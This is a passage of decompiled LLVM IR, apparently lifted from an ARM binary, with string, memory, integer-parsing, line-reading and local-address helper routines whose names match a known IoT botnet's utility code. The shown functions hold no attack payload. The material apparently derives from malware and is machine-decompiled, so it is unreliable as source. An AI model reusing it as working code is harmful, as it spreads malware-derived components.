  store i8 %v0_10808.off0, i8* %v3_10808, align 1
  %v4_10808 = load i32, i32* @r0, align 4
  %v5_10808 = add i32 %v4_10808, 1
  store i32 %v5_10808, i32* @r0, align 4
  br i1 %v3_10804, label %dec_label_pc_10810, label %dec_label_pc_107fc

dec_label_pc_10810:                               ; preds = %dec_label_pc_10800
  %v0_10810 = load i32, i32* %ip.global-to-local, align 4
  ret i32 %v0_10810

; uselistorder directives
  uselistorder i32 %v0_10800, { 1, 0 }
  uselistorder i32 %v1_107e4, { 0, 1, 3, 2 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10800, { 1, 0 }
}

define i32 @util_memcpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %v2_10818 = icmp eq i32 %arg3, 0
  %v0_1081c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10818, i32 %v0_1081c)
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10824

dec_label_pc_10824:                               ; preds = %dec_label_pc_10824, %entry
  %v0_10824 = phi i32 [ %v1_1082c, %dec_label_pc_10824 ], [ 0, %entry ]
  %v2_10824 = add i32 %v0_10824, %arg2
  %v3_10824 = inttoptr i32 %v2_10824 to i8*
  %v4_10824 = load i8, i8* %v3_10824, align 1
  %v4_10828 = add i32 %v0_10824, %arg1
  %v5_10828 = inttoptr i32 %v4_10828 to i8*
  store i8 %v4_10824, i8* %v5_10828, align 1
  %v0_1082c = load i32, i32* %ip.global-to-local, align 4
  %v1_1082c = add i32 %v0_1082c, 1
  store i32 %v1_1082c, i32* %ip.global-to-local, align 4
  %v9_10830 = icmp eq i32 %v1_1082c, %arg3
  br i1 %v9_10830, label %dec_label_pc_10838, label %dec_label_pc_10824

dec_label_pc_10838:                               ; preds = %dec_label_pc_10824
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1082c, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @util_zero() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %v0_1083c = load i32, i32* @r1, align 4
  %v2_1083c = icmp eq i32 %v0_1083c, 0
  %v0_10840 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1083c, i32 %v0_10840)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10848

dec_label_pc_10848:                               ; preds = %dec_label_pc_10848, %entry
  %v2_1084c = phi i32 [ %v1_10850, %dec_label_pc_10848 ], [ 0, %entry ]
  store i32 0, i32* @r3, align 4
  %v3_1084c = load i32, i32* @r0, align 4
  %v4_1084c = add i32 %v3_1084c, %v2_1084c
  %v5_1084c = inttoptr i32 %v4_1084c to i8*
  store i8 0, i8* %v5_1084c, align 1
  %v0_10850 = load i32, i32* %r2.global-to-local, align 4
  %v1_10850 = add i32 %v0_10850, 1
  store i32 %v1_10850, i32* %r2.global-to-local, align 4
  %v1_10854 = load i32, i32* @r1, align 4
  %v9_10854 = icmp eq i32 %v1_10850, %v1_10854
  br i1 %v9_10854, label %dec_label_pc_1085c, label %dec_label_pc_10848

dec_label_pc_1085c:                               ; preds = %dec_label_pc_10848
  %v1_1085c = load i32, i32* @r0, align 4
  ret i32 %v1_1085c

; uselistorder directives
  uselistorder i32 %v1_10850, { 1, 2, 0 }
}

define i32 @util_memsearch(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v7_10874 = icmp sgt i32 %arg4, %arg2
  br i1 %v7_10874, label %dec_label_pc_1087c, label %dec_label_pc_10884

dec_label_pc_1087c:                               ; preds = %dec_label_pc_10898, %dec_label_pc_10884, %entry, %dec_label_pc_108c4
  %storemerge = phi i32 [ %v1_108c4, %dec_label_pc_108c4 ], [ -1, %entry ], [ -1, %dec_label_pc_10884 ], [ -1, %dec_label_pc_10898 ]
  ret i32 %storemerge

dec_label_pc_10884:                               ; preds = %entry
  %tmp12 = icmp slt i32 %arg2, 1
  br i1 %tmp12, label %dec_label_pc_1087c, label %dec_label_pc_1088c

dec_label_pc_1088c:                               ; preds = %dec_label_pc_10884
  br label %dec_label_pc_108a4

dec_label_pc_10898:                               ; preds = %bb, %dec_label_pc_108b8
  %v1_108a43 = phi i32 [ %v1_108b8, %dec_label_pc_108b8 ], [ 0, %bb ]
  %v1_10898 = add i32 %v0_108c4, 1
  %v9_1089c = icmp eq i32 %v1_10898, %arg2
  br i1 %v9_1089c, label %dec_label_pc_1087c, label %dec_label_pc_108a4

dec_label_pc_108a4:                               ; preds = %dec_label_pc_10898, %dec_label_pc_1088c
  %v0_108c4 = phi i32 [ %v1_10898, %dec_label_pc_10898 ], [ 0, %dec_label_pc_1088c ]
  %v1_108a4 = phi i32 [ %v1_108a43, %dec_label_pc_10898 ], [ 0, %dec_label_pc_1088c ]
  %v2_108a4 = add i32 %v1_108a4, %arg3
  %v3_108a4 = inttoptr i32 %v2_108a4 to i8*
  %v4_108a4 = load i8, i8* %v3_108a4, align 1
  %v2_108a8 = add i32 %v0_108c4, %arg1
  %v3_108a8 = inttoptr i32 %v2_108a8 to i8*
  %v4_108a8 = load i8, i8* %v3_108a8, align 1
  %v9_108ac = icmp eq i8 %v4_108a8, %v4_108a4
  br i1 %v9_108ac, label %dec_label_pc_108b8, label %bb

bb:                                               ; preds = %dec_label_pc_108a4
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_10898

dec_label_pc_108b8:                               ; preds = %dec_label_pc_108a4
  %v1_108b8 = add i32 %v1_108a4, 1
  store i32 %v1_108b8, i32* @ip, align 4
  %v9_108bc = icmp eq i32 %v1_108b8, %arg4
  br i1 %v9_108bc, label %dec_label_pc_108c4, label %dec_label_pc_10898

dec_label_pc_108c4:                               ; preds = %dec_label_pc_108b8
  %v1_108c4 = add i32 %v0_108c4, 1
  br label %dec_label_pc_1087c

; uselistorder directives
  uselistorder i32 %v1_108b8, { 1, 2, 0 }
  uselistorder i32 %v1_108a4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10898, { 1, 0 }
  uselistorder label %dec_label_pc_1087c, { 3, 0, 1, 2 }
}

define i32 @util_atoi(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_108dc

dec_label_pc_108dc:                               ; preds = %.thread, %dec_label_pc_108f0, %bb, %entry
  %v0_108dc = phi i32 [ %tmp, %entry ], [ %v5_108dc, %bb ], [ %v5_108dc, %dec_label_pc_108f0 ], [ %v5_108dc, %.thread ]
  %v1_108dc = inttoptr i32 %v0_108dc to i8*
  %v2_108dc = load i8, i8* %v1_108dc, align 1
  %v5_108dc = add i32 %v0_108dc, 1
  %v7_108e0 = icmp eq i8 %v2_108dc, 9
  br i1 %v7_108e0, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_108dc
  br label %dec_label_pc_108dc

bb:                                               ; preds = %dec_label_pc_108dc
  %v8_108e4 = icmp eq i8 %v2_108dc, 32
  br i1 %v8_108e4, label %dec_label_pc_108dc, label %dec_label_pc_108f0

dec_label_pc_108f0:                               ; preds = %bb
  %v7_108f0 = icmp eq i8 %v2_108dc, 10
  br i1 %v7_108f0, label %dec_label_pc_108dc, label %dec_label_pc_108f8

dec_label_pc_108f8:                               ; preds = %dec_label_pc_108f0
  %v7_108f8 = icmp eq i8 %v2_108dc, 45
  br i1 %v7_108f8, label %dec_label_pc_109e8, label %dec_label_pc_10900

dec_label_pc_10900:                               ; preds = %dec_label_pc_108f8
  %v7_10900 = icmp eq i8 %v2_108dc, 43
  br i1 %v7_10900, label %bb54, label %dec_label_pc_10910

bb54:                                             ; preds = %dec_label_pc_10900
  %v2_10904 = inttoptr i32 %v5_108dc to i8*
  %v3_10904 = load i8, i8* %v2_10904, align 1
  %v6_10904 = add i32 %v0_108dc, 2
  br label %dec_label_pc_10910

dec_label_pc_10910:                               ; preds = %bb54, %dec_label_pc_10900, %dec_label_pc_109e8
  %v1_109b839 = phi i32 [ %v5_109e8, %dec_label_pc_109e8 ], [ %v5_108dc, %dec_label_pc_10900 ], [ %v6_10904, %bb54 ]
  %v0_1093810.in = phi i8 [ %v2_109e8, %dec_label_pc_109e8 ], [ %v2_108dc, %dec_label_pc_10900 ], [ %v3_10904, %bb54 ]
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_109e8 ], [ 2147483647, %dec_label_pc_10900 ], [ 2147483647, %bb54 ]
  %v0_109f8 = phi i32 [ 1, %dec_label_pc_109e8 ], [ 0, %dec_label_pc_10900 ], [ 0, %bb54 ]
  %v2_10918 = udiv i32 %storemerge1, %arg2
  %v3_10918 = urem i32 %storemerge1, %arg2
  br label %dec_label_pc_10938.outer

dec_label_pc_10938.outer:                         ; preds = %.thread5, %dec_label_pc_10910
  %v1_109b8.ph = phi i32 [ %v6_109b8, %.thread5 ], [ %v1_109b839, %dec_label_pc_10910 ]
  %v2_109b4.ph = phi i32 [ %v5_109b4, %.thread5 ], [ 0, %dec_label_pc_10910 ]
  %v1_10978.ph.in = phi i8 [ %v3_109b8, %.thread5 ], [ %v0_1093810.in, %dec_label_pc_10910 ]
  %v1_10990.ph = phi i32 [ 1, %.thread5 ], [ 0, %dec_label_pc_10910 ]
  %v3_10984 = icmp uge i32 %v2_109b4.ph, %v2_10918
  %v9_10984 = icmp eq i32 %v2_109b4.ph, %v2_10918
  %v2_10988 = xor i1 %v3_10984, true
  %v3_10988 = or i1 %v9_10984, %v2_10988
  %v2_1098c = xor i1 %v9_10984, true
  %v3_1098c = and i1 %v3_10984, %v2_1098c
  %v2_109ac = icmp eq i1 %v9_10984, false
  br label %dec_label_pc_10938

dec_label_pc_10938:                               ; preds = %dec_label_pc_10938.outer, %dec_label_pc_109c0
  %v1_109b8 = phi i32 [ %v5_109c0, %dec_label_pc_109c0 ], [ %v1_109b8.ph, %dec_label_pc_10938.outer ]
  %v1_10990 = phi i32 [ -1, %dec_label_pc_109c0 ], [ %v1_10990.ph, %dec_label_pc_10938.outer ]
  %v1_10978.in = phi i8 [ %v2_109c0, %dec_label_pc_109c0 ], [ %v1_10978.ph.in, %dec_label_pc_10938.outer ]
  %v1_10978 = zext i8 %v1_10978.in to i32
  %v1_10938 = urem i32 %v1_10978, 256
  %v1_1093c = add nsw i32 %v1_10938, -48
  %v1_10944 = add nsw i32 %v1_10938, -97
  %v1_10948 = add nsw i32 %v1_10978, -48
  %v1_1094c = add nsw i32 %v1_10938, -65
  %tmp87 = icmp ult i32 %v1_1093c, 10
  br i1 %tmp87, label %dec_label_pc_1097c, label %dec_label_pc_10954

dec_label_pc_10954:                               ; preds = %dec_label_pc_10938
  %v2_10954 = icmp ugt i32 %v1_1094c, 24
  %v7_10954 = icmp eq i32 %v1_1094c, 25
  %v2_10958 = xor i1 %v7_10954, true
  %v3_10958 = and i1 %v2_10954, %v2_10958
  br i1 %v3_10958, label %bb55, label %bb56

bb55:                                             ; preds = %dec_label_pc_10954
  br label %bb56

bb56:                                             ; preds = %dec_label_pc_10954, %bb55
  %v0_1096c15 = phi i32 [ %v1_10948, %dec_label_pc_10954 ], [ 0, %bb55 ]
  %v2_1095c = xor i1 %v2_10954, true
  %v3_1095c = or i1 %v7_10954, %v2_1095c
  br i1 %v3_1095c, label %bb57, label %bb58

bb57:                                             ; preds = %bb56
  br label %bb58

bb58:                                             ; preds = %bb56, %bb57
  %v0_1096c = phi i32 [ %v0_1096c15, %bb56 ], [ 1, %bb57 ]
  br i1 %v3_10958, label %bb59, label %bb60

bb59:                                             ; preds = %bb58
  %v6_10964 = icmp ugt i32 %v1_10944, 24
  %v11_10964 = icmp eq i32 %v1_10944, 25
  br label %bb60

bb60:                                             ; preds = %bb58, %bb59
  %v1_10968 = phi i1 [ %v7_10954, %bb58 ], [ %v11_10964, %bb59 ]
  %v0_10968 = phi i1 [ %v2_10954, %bb58 ], [ %v6_10964, %bb59 ]
  %v2_10968 = xor i1 %v1_10968, true
  %v3_10968 = and i1 %v0_10968, %v2_10968
  br i1 %v3_10968, label %dec_label_pc_109cc, label %dec_label_pc_1096c

dec_label_pc_1096c:                               ; preds = %bb60
  %v2_1096c = icmp eq i32 %v0_1096c, 0
  %. = select i1 %v2_1096c, i32 87, i32 55
  %v2_10978 = sub nsw i32 %v1_10978, %.
  br label %dec_label_pc_1097c

dec_label_pc_1097c:                               ; preds = %dec_label_pc_10938, %dec_label_pc_1096c
  %v0_1099033 = phi i32 [ %v1_1094c, %dec_label_pc_10938 ], [ %., %dec_label_pc_1096c ]
  %v3_109b4 = phi i32 [ %v1_10948, %dec_label_pc_10938 ], [ %v2_10978, %dec_label_pc_1096c ]
  %v2_1097c = sub i32 %v3_109b4, %arg2
  %v4_1097c = xor i32 %v3_109b4, %arg2
  %v5_1097c = xor i32 %v2_1097c, %v3_109b4
  %v6_1097c = and i32 %v5_1097c, %v4_1097c
  %v7_1097c = icmp slt i32 %v6_1097c, 0
  %v8_1097c = icmp slt i32 %v2_1097c, 0
  %v2_10980 = xor i1 %v8_1097c, %v7_1097c
  br i1 %v2_10980, label %dec_label_pc_10984, label %dec_label_pc_109cc

dec_label_pc_10984:                               ; preds = %dec_label_pc_1097c
  br i1 %v3_10988, label %bb63, label %bb64

bb63:                                             ; preds = %dec_label_pc_10984
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_10984, %bb63
  %v0_1099032 = phi i32 [ %v0_1099033, %dec_label_pc_10984 ], [ 0, %bb63 ]
  br i1 %v3_1098c, label %bb65, label %bb66

bb65:                                             ; preds = %bb64
  br label %bb66

bb66:                                             ; preds = %bb64, %bb65
  %v0_10990 = phi i32 [ %v0_1099032, %bb64 ], [ 1, %bb65 ]
  %tmp88 = icmp slt i32 %v1_10990, 0
  %v4_10990 = zext i1 %tmp88 to i32
  %v5_10990 = or i32 %v0_10990, %v4_10990
  %v7_10990 = icmp eq i32 %v5_10990, 0
  br i1 %v7_10990, label %dec_label_pc_10998, label %dec_label_pc_109c0

dec_label_pc_10998:                               ; preds = %bb66
  %v2_109a4 = sub i32 %v3_109b4, %v3_10918
  %v4_109a4 = xor i32 %v3_109b4, %v3_10918
  %v5_109a4 = xor i32 %v2_109a4, %v3_109b4
  %v6_109a4 = and i32 %v5_109a4, %v4_109a4
  %v7_109a4 = icmp slt i32 %v6_109a4, 0
  %v8_109a4 = icmp slt i32 %v2_109a4, 0
  %v9_109a4 = icmp eq i32 %v3_109b4, %v3_10918
  %v3_109a8 = xor i1 %v8_109a4, %v7_109a4
  %v4_109a8 = or i1 %v9_109a4, %v3_109a8
  br i1 %v4_109a8, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_10998
  br label %.thread5

thread-pre-split:                                 ; preds = %dec_label_pc_10998
  br i1 %v2_109ac, label %.thread5, label %dec_label_pc_109c0

.thread5:                                         ; preds = %thread-pre-split, %thread-pre-split.thread
  %v4_109b4 = mul i32 %v2_109b4.ph, %arg2
  %v5_109b4 = add i32 %v3_109b4, %v4_109b4
  %v2_109b8 = inttoptr i32 %v1_109b8 to i8*
  %v3_109b8 = load i8, i8* %v2_109b8, align 1
  %v6_109b8 = add i32 %v1_109b8, 1
  br label %dec_label_pc_10938.outer

dec_label_pc_109c0:                               ; preds = %thread-pre-split, %bb66
  %v1_109c0 = inttoptr i32 %v1_109b8 to i8*
  %v2_109c0 = load i8, i8* %v1_109c0, align 1
  %v5_109c0 = add i32 %v1_109b8, 1
  br label %dec_label_pc_10938

dec_label_pc_109cc:                               ; preds = %dec_label_pc_1097c, %bb60
  %v1_109cc = icmp slt i32 %v1_10990, 0
  %v2_109f8 = icmp eq i32 %v0_109f8, 0
  br i1 %v1_109cc, label %dec_label_pc_109f8, label %dec_label_pc_109d4

dec_label_pc_109d4:                               ; preds = %dec_label_pc_109cc
  br i1 %v2_109f8, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_109d4
  %v2_109d8 = sub i32 0, %v2_109b4.ph
  br label %bb70

bb70:                                             ; preds = %.thread43, %bb71, %dec_label_pc_109d4, %bb69
  %v1_109e4 = phi i32 [ -2147483648, %bb71 ], [ %v2_109b4.ph, %dec_label_pc_109d4 ], [ %v2_109d8, %bb69 ], [ 2147483647, %.thread43 ]
  ret i32 %v1_109e4

dec_label_pc_109e8:                               ; preds = %dec_label_pc_108f8
  %v1_109e8 = inttoptr i32 %v5_108dc to i8*
  %v2_109e8 = load i8, i8* %v1_109e8, align 1
  %v5_109e8 = add i32 %v0_108dc, 2
  br label %dec_label_pc_10910

dec_label_pc_109f8:                               ; preds = %dec_label_pc_109cc
  br i1 %v2_109f8, label %.thread43, label %bb71

.thread43:                                        ; preds = %dec_label_pc_109f8
  br label %bb70

bb71:                                             ; preds = %dec_label_pc_109f8
  br label %bb70

; uselistorder directives
  uselistorder i1 %v2_109f8, { 1, 0 }
  uselistorder i32 %v2_109a4, { 1, 0 }
  uselistorder i32 %v2_1097c, { 1, 0 }
  uselistorder i32 %v3_109b4, { 0, 6, 1, 2, 5, 3, 4, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_10954, { 1, 2, 0 }
  uselistorder i1 %v2_10954, { 1, 0, 2 }
  uselistorder i32 %v1_10938, { 1, 2, 0 }
  uselistorder i32 %v1_10978, { 1, 0, 2 }
  uselistorder i32 %v1_10990, { 1, 0 }
  uselistorder i32 %v1_109b8, { 2, 3, 1, 0 }
  uselistorder i1 %v9_10984, { 1, 0, 2 }
  uselistorder i1 %v3_10984, { 1, 0 }
  uselistorder i32 %v2_109b4.ph, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v3_10918, { 1, 0, 2 }
  uselistorder i32 %v2_10918, { 1, 0 }
  uselistorder i32 %v5_108dc, { 4, 3, 5, 2, 1, 0 }
  uselistorder i32 %v0_108dc, { 0, 1, 3, 2 }
  uselistorder i32 25, { 15, 16, 9, 2, 3, 4, 0, 10, 5, 11, 1, 12, 6, 7, 13, 8, 14 }
  uselistorder i8 32, { 8, 9, 10, 11, 12, 13, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i8 9, { 2, 0, 1 }
  uselistorder label %bb70, { 1, 0, 3, 2 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
  uselistorder label %dec_label_pc_1097c, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
  uselistorder label %bb56, { 1, 0 }
  uselistorder label %dec_label_pc_10938, { 1, 0 }
  uselistorder label %dec_label_pc_10910, { 2, 0, 1 }
  uselistorder label %dec_label_pc_108dc, { 1, 2, 0, 3 }
}

define i32 @util_fdgets(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_10a08 = load i32, i32* @r4, align 4
  store i32 %v3_10a08, i32* %stack_var_-24, align 4
  %v6_10a08 = load i32, i32* @r5, align 4
  %v9_10a08 = load i32, i32* @r6, align 4
  %v12_10a08 = load i32, i32* @r7, align 4
  %v15_10a08 = load i32, i32* @r8, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_10a20

dec_label_pc_10a20:                               ; preds = %dec_label_pc_10a44.dec_label_pc_10a20_crit_edge, %entry
  %v0_10a24 = phi i32 [ %v0_10a24.pre, %dec_label_pc_10a44.dec_label_pc_10a20_crit_edge ], [ %arg3, %entry ]
  %v0_10a20 = phi i32 [ %v5_10a44, %dec_label_pc_10a44.dec_label_pc_10a20_crit_edge ], [ %tmp, %entry ]
  store i32 %v0_10a20, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v1_10a2c = call i32 @__libc_read(i32 %v0_10a24)
  %v7_10a30 = icmp eq i32 %v1_10a2c, 1
  %v0_10a38 = load i32, i32* @r5, align 4
  br i1 %v7_10a30, label %dec_label_pc_10a38, label %dec_label_pc_10a50

dec_label_pc_10a38:                               ; preds = %dec_label_pc_10a20
  %v1_10a38 = add i32 %v0_10a38, 1
  store i32 %v1_10a38, i32* @r5, align 4
  %v1_10a3c = load i32, i32* @r8, align 4
  %v6_10a40 = icmp slt i32 %v1_10a38, %v1_10a3c
  br i1 %v6_10a40, label %dec_label_pc_10a44, label %.loopexit

dec_label_pc_10a44:                               ; preds = %dec_label_pc_10a38
  %v0_10a44 = load i32, i32* @r4, align 4
  %v1_10a44 = inttoptr i32 %v0_10a44 to i8*
  %v2_10a44 = load i8, i8* %v1_10a44, align 1
  %v3_10a44 = zext i8 %v2_10a44 to i32
  store i32 %v3_10a44, i32* @r3, align 4
  %v5_10a44 = add i32 %v0_10a44, 1
  store i32 %v5_10a44, i32* @r4, align 4
  %v7_10a48 = icmp eq i8 %v2_10a44, 10
  br i1 %v7_10a48, label %dec_label_pc_10a50, label %dec_label_pc_10a44.dec_label_pc_10a20_crit_edge

dec_label_pc_10a44.dec_label_pc_10a20_crit_edge:  ; preds = %dec_label_pc_10a44
  %v0_10a24.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_10a20

dec_label_pc_10a50:                               ; preds = %dec_label_pc_10a20, %dec_label_pc_10a44
  %v0_10a50 = phi i32 [ %v1_10a38, %dec_label_pc_10a44 ], [ %v0_10a38, %dec_label_pc_10a20 ]
  %v2_10a50 = icmp eq i32 %v0_10a50, 0
  br i1 %v2_10a50, label %bb, label %.loopexit

bb:                                               ; preds = %dec_label_pc_10a50
  store i32 0, i32* @r7, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_10a38, %dec_label_pc_10a50, %bb
  %v0_10a58 = load i32, i32* @r7, align 4
  %v2_10a5c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_10a5c, i32* @r4, align 4
  store i32 %v6_10a08, i32* @r5, align 4
  store i32 %v9_10a08, i32* @r6, align 4
  store i32 %v12_10a08, i32* @r7, align 4
  store i32 %v15_10a08, i32* @r8, align 4
  ret i32 %v0_10a58

; uselistorder directives
  uselistorder i32 %v5_10a44, { 1, 0 }
  uselistorder label %.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10a50, { 1, 0 }
}

define i32 @util_local_addr() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10a64 = load i32, i32* @r4, align 4
  %v6_10a64 = load i32, i32* @r5, align 4
  %v9_10a64 = load i32, i32* @r6, align 4
  store i32 16, i32* @r6, align 4
  store i32 16, i32* %stack_var_-20, align 4
  %v0_10a74 = call i32 @__GI___errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_10a7c = inttoptr i32 %v0_10a74 to i32*
  store i32 0, i32* %v2_10a7c, align 4
  %v0_10a88 = load i32, i32* %r4.global-to-local, align 4
  %v3_10a8c = call i32 @socket(i32 2, i32 2, i32 %v0_10a88)
  %v7_10a90 = icmp eq i32 %v3_10a8c, -1
  store i32 %v3_10a8c, i32* @r5, align 4
  br i1 %v7_10a90, label %bb, label %dec_label_pc_10aa0

bb:                                               ; preds = %entry
  %v1_10a98 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10aec

dec_label_pc_10aa0:                               ; preds = %entry
  %v2_10aac = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_10aac, i32* @r4, align 4
  %v0_10ab8 = load i32, i32* @r6, align 4
  store i32 2, i32* %stack_var_-36, align 4
  %v3_10acc = call i32 @__libc_connect(i32 %v3_10a8c, i32 %v2_10aac, i32 %v0_10ab8)
  store i32 %v2_10aac, i32* @r1, align 4
  %v2_10ad4 = ptrtoint i32* %stack_var_-20 to i32
  %v0_10ad8 = load i32, i32* @r5, align 4
  %v3_10adc = call i32 @__GI_getsockname(i32 %v0_10ad8, i32 %v2_10aac, i32 %v2_10ad4)
  %v0_10ae0 = load i32, i32* @r5, align 4
  %v1_10ae4 = call i32 @__GI___libc_close(i32 %v0_10ae0)
  br label %dec_label_pc_10aec

dec_label_pc_10aec:                               ; preds = %bb, %dec_label_pc_10aa0
  %storemerge = phi i32 [ 134744072, %dec_label_pc_10aa0 ], [ %v1_10a98, %bb ]
  store i32 %v3_10a64, i32* @r4, align 4
  store i32 %v6_10a64, i32* @r5, align 4
  store i32 %v9_10a64, i32* @r6, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_10aac, { 1, 0, 2, 3 }
  uselistorder i32 %v3_10a8c, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 7, 9, 1, 8, 6, 5, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 26, 28, 25, 4, 27, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 0, 10, 9, 8, 7, 6, 5, 1, 3, 2 }
  uselistorder i32 ()* @__GI___errno_location, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10aec, { 1, 0 }
}

define i32 @util_stristr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp23 = ptrtoint i8* %arg1 to i32
  %v3_10afc = load i8, i8* %tmp, align 1
  %v4_10afc = zext i8 %v3_10afc to i32
  store i32 %v4_10afc, i32* @r3, align 4
  %v2_10b00 = icmp eq i8 %v3_10afc, 0
  br i1 %v2_10b00, label %bb, label %dec_label_pc_10b14

bb:                                               ; preds = %entry
  br label %dec_label_pc_10b28

dec_label_pc_10b14:                               ; preds = %entry
  br label %dec_label_pc_10b18

dec_label_pc_10b18:                               ; preds = %dec_label_pc_10b18, %dec_label_pc_10b14
  %v0_10b18 = phi i32 [ %v1_10b18, %dec_label_pc_10b18 ], [ 0, %dec_label_pc_10b14 ]
  %v1_10b18 = add i32 %v0_10b18, 1
  %v2_10b1c = add i32 %v1_10b18, %arg2
  %v3_10b1c = inttoptr i32 %v2_10b1c to i8*
  %v4_10b1c = load i8, i8* %v3_10b1c, align 1
  %v6_10b1c = zext i8 %v4_10b1c to i32
  store i32 %v6_10b1c, i32* @r3, align 4
  %v2_10b20 = icmp eq i8 %v4_10b1c, 0
  br i1 %v2_10b20, label %dec_label_pc_10b28, label %dec_label_pc_10b18

dec_label_pc_10b28:                               ; preds = %dec_label_pc_10b18, %bb
  %v0_10b6c21 = phi i32 [ %v4_10afc, %bb ], [ %v1_10b18, %dec_label_pc_10b18 ]
  %v0_10b302 = load i32, i32* @r1, align 4
  %tmp29 = icmp slt i32 %v0_10b302, 1
  br i1 %tmp29, label %dec_label_pc_10b80, label %dec_label_pc_10b3c

dec_label_pc_10b3c:                               ; preds = %dec_label_pc_10b28, %dec_label_pc_10b30.backedge
  %v0_10b34.in = phi i32 [ %v0_10b34, %dec_label_pc_10b30.backedge ], [ %v0_10b302, %dec_label_pc_10b28 ]
  %v1_10b48 = phi i32 [ %v1_10b4815, %dec_label_pc_10b30.backedge ], [ 0, %dec_label_pc_10b28 ]
  %v0_10b3c = phi i32 [ %v5_10b3c, %dec_label_pc_10b30.backedge ], [ %tmp23, %dec_label_pc_10b28 ]
  %v0_10b34 = add i32 %v0_10b34.in, -1
  %v1_10b3c = inttoptr i32 %v0_10b3c to i8*
  %v2_10b3c = load i8, i8* %v1_10b3c, align 1
  %v3_10b3c = zext i8 %v2_10b3c to i32
  %v5_10b3c = add i32 %v0_10b3c, 1
  %v1_10b40 = add nsw i32 %v3_10b3c, -65
  %v2_10b48 = add i32 %v1_10b48, %arg2
  %v3_10b48 = inttoptr i32 %v2_10b48 to i8*
  %v4_10b48 = load i8, i8* %v3_10b48, align 1
  %v6_10b48 = zext i8 %v4_10b48 to i32
  store i32 %v6_10b48, i32* @r3, align 4
  %v1_10b4c = add nsw i32 %v6_10b48, -65
  %tmp38 = icmp ult i32 %v1_10b40, 26
  br i1 %tmp38, label %bb30, label %bb31

bb30:                                             ; preds = %dec_label_pc_10b3c
  %v5_10b50 = or i32 %v3_10b3c, 96
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_10b3c, %bb30
  %v0_10b5c = phi i32 [ %v3_10b3c, %dec_label_pc_10b3c ], [ %v5_10b50, %bb30 ]
  %tmp39 = icmp ult i32 %v1_10b4c, 26
  br i1 %tmp39, label %bb32, label %bb33

bb32:                                             ; preds = %bb31
  %v5_10b58 = or i32 %v6_10b48, 96
  store i32 %v5_10b58, i32* @r3, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v1_10b5c = phi i32 [ %v6_10b48, %bb31 ], [ %v5_10b58, %bb32 ]
  %v9_10b5c = icmp eq i32 %v0_10b5c, %v1_10b5c
  br i1 %v9_10b5c, label %dec_label_pc_10b68, label %bb34

bb34:                                             ; preds = %bb33
  br label %dec_label_pc_10b30.backedge

dec_label_pc_10b30.backedge:                      ; preds = %bb34, %dec_label_pc_10b68
  %v1_10b4815 = phi i32 [ 0, %bb34 ], [ %v1_10b68, %dec_label_pc_10b68 ]
  %tmp35 = icmp slt i32 %v0_10b34, 1
  br i1 %tmp35, label %dec_label_pc_10b80, label %dec_label_pc_10b3c

dec_label_pc_10b68:                               ; preds = %bb33
  %v1_10b68 = add i32 %v1_10b48, 1
  %v9_10b6c = icmp eq i32 %v0_10b6c21, %v1_10b68
  br i1 %v9_10b6c, label %dec_label_pc_10b74, label %dec_label_pc_10b30.backedge

